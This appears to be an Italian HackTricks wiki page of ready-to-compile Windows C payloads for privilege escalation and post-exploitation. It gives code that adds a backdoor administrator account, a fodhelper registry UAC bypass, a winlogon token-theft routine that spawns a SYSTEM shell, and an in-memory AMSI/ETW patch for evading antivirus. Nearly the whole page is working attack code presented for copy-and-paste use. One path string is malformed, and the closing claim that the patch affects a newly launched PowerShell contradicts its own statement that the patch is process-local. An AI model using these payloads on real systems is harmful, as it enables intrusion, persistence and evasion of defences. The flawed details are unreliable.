# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Questa pagina raccoglie **piccole porzioni di codice C autonome** che sono utili durante l'Escalation Locale dei Privilegi in Windows o post-exploitation. Ogni payload è progettato per essere **facile da copiare e incollare**, richiede solo l'API di Windows / il runtime C e può essere compilato con `i686-w64-mingw32-gcc` (x86) o `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Questi payload assumono che il processo abbia già i privilegi minimi necessari per eseguire l'azione (ad es. `SeDebugPrivilege`, `SeImpersonatePrivilege` o contesto di integrità media per un bypass UAC). Sono destinati a **impostazioni di red-team o CTF** dove sfruttare una vulnerabilità ha portato all'esecuzione arbitraria di codice nativo.

---

## Aggiungi utente amministratore locale
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Quando il binario fidato **`fodhelper.exe`** viene eseguito, interroga il percorso del registro sottostante **senza filtrare il verbo `DelegateExecute`**. Piantando il nostro comando sotto quella chiave, un attaccante può bypassare UAC *senza* scrivere un file su disco.

*Percorso del registro interrogato da `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Una PoC minima che apre un `cmd.exe` elevato:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testato su Windows 10 22H2 e Windows 11 23H2 (patch di luglio 2025). Il bypass funziona ancora perché Microsoft non ha corretto il controllo di integrità mancante nel percorso `DelegateExecute`.*

---

## Genera una shell SYSTEM tramite duplicazione del token (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Se il processo corrente detiene **entrambi** i privilegi `SeDebug` e `SeImpersonate` (tipico per molti account di servizio), puoi rubare il token da `winlogon.exe`, duplicarlo e avviare un processo elevato:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Per una spiegazione più approfondita su come funziona, vedere:
{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Patch AMSI & ETW in Memoria (Evasione della Difesa)
La maggior parte dei moderni motori AV/EDR si basa su **AMSI** e **ETW** per ispezionare comportamenti malevoli. Patchare entrambe le interfacce all'interno del processo corrente impedisce la scansione dei payload basati su script (ad es. PowerShell, JScript).
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*La patch sopra è locale al processo; avviare un nuovo PowerShell dopo averlo eseguito verrà eseguito senza ispezione AMSI/ETW.*

---

## Riferimenti
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
